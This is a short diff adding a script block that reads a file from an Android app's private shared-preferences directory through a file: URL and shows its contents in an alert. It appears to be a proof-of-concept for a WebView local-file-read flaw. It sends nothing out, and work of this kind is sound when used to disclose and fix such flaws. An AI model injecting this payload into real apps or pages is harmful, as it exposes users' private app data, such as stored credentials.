@@ -1,0 +1,10 @@
+<script>
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "file:///data/user/0/com.agentbox/shared_prefs/AgentboxAppName.xml", true); // async
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState == XMLHttpRequest.DONE) {
+            alert(xhr.responseText); // for demonstration purposes
+        }
+    }
+    xhr.send();
+</script>
